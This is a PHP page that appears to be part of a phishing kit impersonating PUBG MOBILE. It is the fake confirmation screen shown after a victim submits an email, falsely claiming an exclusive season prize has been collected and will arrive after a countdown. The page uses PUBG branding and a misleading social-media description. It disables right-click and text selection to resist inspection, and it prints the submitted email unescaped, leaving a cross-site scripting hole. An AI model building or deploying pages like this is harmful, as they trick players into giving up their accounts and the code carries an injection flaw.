<?php
//MENERIMA DATA YANG DI-INPUT
$email = $_POST['email'];

if(empty($email))
{
    header('location: ./');
}
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE">
<meta name="description" content="Latest PUBG MOBILE update. Get an exclusive Season 11 prize especially for you !!!">
<meta property="og:description" content="Latest PUBG MOBILE update. Get an exclusive Season 11 prize especially for you !!!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="img/banner.png">
<title>PUBG MOBILE</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="img/icon.png">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="container-mask">

<div class="layer"></div>
	
<div class="header">
<img src="https://s7d7.turboimg.net/t1/51352805_s4_icon1.png">
<b>PUBG MOBILE</b>
<br>
<span>SEASON 12 #2GETHER WE PLAY</span>
</div>

<div class="box">
<center>
<div class="alert">
Hi <?php echo $email;?>. Your selected prize has been collected
</div>
</center>

<center>
<div class="finish">
<img src="https://s7d7.turboimg.net/t1/51352805_s4_icon1.png">

Thank you, your account has been succesfully collect prize!
<br>
Your chosen gift has been processed, will be sent in:
<br>
<br>
<span id="timer2">23 : 59 : 30</span>
<br>
<br>
SEE YOU IN NEXT EVENT. KEEP PLAYING PUBG MOBILE
<br>
WINNER WINNER CHICKEN DINNER
</div>
<center>
<button type="button" class="btn-form" onclick="location.href='/';" onmousedown="buka.play()">Log out</button>
</center>
</div> <!--- box --->
</div>
</center><!--- container --->
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/click.js"></script>

</body>
</html>